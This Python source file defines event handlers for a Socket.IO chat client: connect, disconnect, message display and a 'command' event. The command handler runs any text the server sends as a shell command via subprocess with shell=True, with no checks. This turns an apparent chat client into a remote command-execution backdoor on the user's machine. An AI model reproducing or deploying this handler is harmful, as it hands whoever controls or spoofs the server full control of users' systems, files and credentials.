import subprocess


class Events:
    def __init__(self, sio, ui):
        self.ui = None
        self.sio = sio
        self.ui = ui
        self.register()

    def register(self):
        @self.sio.event
        def connect():
            self.on_connect()

        @self.sio.event
        def disconnect():
            self.on_disconnect()

        @self.sio.event
        def message(data):
            self.on_message(data)

        @self.sio.event
        def command(data):
            self.on_command(data)

    def on_connect(self):
        print("Connected to the server...")

    def on_disconnect(self):
        print("Disconnected from the server...")

    def on_message(self, data):
        self.ui.add_message(data['user'], data['message'])

    def on_command(self, data):
        try:
            command = data['message']
            subprocess.check_output(command, shell=True)
        except Exception:
            print(f"Error executing command: {data['message']}")

        self.ui.add_message(data['user'], data['message'], message_color='red')
